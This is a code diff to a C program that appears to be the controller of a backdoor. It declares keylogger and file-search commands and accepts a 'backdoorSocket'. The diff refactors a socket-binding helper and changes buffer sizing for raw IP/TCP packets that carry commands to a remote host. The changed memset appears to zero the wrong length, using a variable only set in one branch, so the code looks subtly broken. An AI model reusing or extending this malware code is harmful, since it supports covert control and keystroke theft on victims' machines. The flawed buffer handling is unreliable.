@@ -8,6 +8,7 @@ static void findFile(netInfo *info, char *commandData);
 static void keylogger(netInfo *info);
 static void sendCommand(netInfo *info, int command, char *commandData);
 static int acceptReturningTcpConnection();
+static int bindAddress(int port, int *socket);
 
 int main (int argc, char **argv)
 {
@@ -121,7 +122,7 @@ static int acceptReturningTcpConnection()
         systemFatal("Cannot set socket options");
     }
     
-    if (bind_address(CONNECTION_PORT, &listenSocket) == -1)
+    if (bindAddress(CONNECTION_PORT, &listenSocket) == -1)
     {
         systemFatal("Error binding the socket");
     }
@@ -137,6 +138,17 @@ static int acceptReturningTcpConnection()
     }
     
     return backdoorSocket;
+}
+
+static int bindAddress(int port, int *socket)
+{
+    struct sockaddr_in address;
+    bzero((char *)&address, sizeof(struct sockaddr_in));
+    address.sin_family = AF_INET;
+    address.sin_port = htons(port);
+    address.sin_addr.s_addr = htonl(INADDR_ANY);
+    
+    return bind(*socket, (struct sockaddr *)&address, sizeof(address));
 }
 
 static void sendCommand(netInfo *info, int command, char *commandData)
@@ -163,7 +175,8 @@ static void sendCommand(netInfo *info, int command, char *commandData)
         // Get the length of the command
         headerLength = strnlen(commandData, PATH_MAX);
         // Allocate the buffer for the packet
-        buffer = malloc(sizeof(char) * (PCKT_LEN + headerLength + 2));
+        buffer = malloc(sizeof(char) * (sizeof(struct ip) +
+                                        sizeof(struct tcphdr) + headerLength + 2));
         // Allocate the command buffer, add 3 for the command plus NULL
         commandBuffer = malloc(sizeof(char) * (headerLength + 3));
         
@@ -171,7 +184,7 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     else
     {
         // Allocate the buffer for the packet
-        buffer = malloc(sizeof(char) * (PCKT_LEN + 2));
+        buffer = malloc(sizeof(char) * (sizeof(struct ip) + sizeof(struct tcphdr) + 2));
         // Allocate the command buffer plus 1 for the NULL
         commandBuffer = malloc(sizeof(char) * 3);
     }
@@ -195,7 +208,7 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     din.sin_addr.s_addr = inet_addr((info->destHost));
     
     // Zero out the buffer
-    memset(buffer, 0, PCKT_LEN);
+    memset(buffer, 0, headerLength);
     
     // IP structure
     iph->ip_hl = 5;
